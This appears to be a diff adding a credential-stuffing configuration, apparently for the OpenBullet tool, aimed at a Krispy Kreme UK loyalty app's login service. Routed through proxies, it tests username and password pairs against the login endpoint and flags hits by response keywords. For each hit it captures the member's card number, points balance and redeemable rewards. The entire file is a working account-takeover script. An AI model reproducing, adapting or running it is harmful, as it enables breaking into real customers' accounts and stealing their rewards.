@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "KrispyKremeUK",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-04T15:41:49.4145152+01:00",
+  "AdditionalInfo": "",
+  "Author": "Meowtit",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION CurrentUnixTime -> VAR "Time" 
+FUNCTION Hash MD5 "<PASS>" -> VAR "HashedPass" 
+REQUEST GET "https://appmobile.loyalty3.com/LoyaltyMobile.svc/Login_new?callBack=jQuery20305111931226642943_1554382361167&username=<USER>&password=<HashedPass>&_=<Time>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The Email or Card Number and Password you provided do not match. Please verify and try again" 
+    KEY "responseCode\":\"0" 
+  KEYCHAIN Success OR 
+    KEY "responseCode\":\"1\"" 
+#PARSE_cardNumber PARSE "<SOURCE>" LR "cardNumber\":\"" "\"" -> VAR "cardNumber" 
+#PARSE_memberId PARSE "<SOURCE>" LR "memberId\":\"" "\"" -> VAR "memberId" 
+REQUEST GET "https://appmobile.loyalty3.com/LoyaltyMobile.svc/member_info?callBack=jQuery2030037818586467082804_1554382758305&username=<cardNumber>&password=<HashedPass>&memberId=<memberId>&_=<Time>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#PARSE_balanceCurrency PARSE "<SOURCE>" LR "balanceCurrency\":\"" "\"" -> CAP "balanceCurrency" 
+#PARSE_balancePoints PARSE "<SOURCE>" LR "balancePoints\":\"" "\"" -> CAP "balancePoints" 
+#PARSE_readyToRedeem PARSE "<SOURCE>" LR "readyToRedeem\":\"" "\"" -> CAP "readyToRedeem" 
+#PARSE_rewardDescription PARSE "<SOURCE>" LR "rewardDescription\":\"" "\"" Recursive=TRUE -> CAP "rewardDescription" 
+#PARSE_visitsToGo PARSE "<SOURCE>" LR "visitsToGo\":\"" "\"" Recursive=TRUE -> CAP "visitsToGo" 
+#PARSE_numberRest PARSE "<SOURCE>" LR "numberRest\":" "," Recursive=TRUE -> CAP "numberRest" 
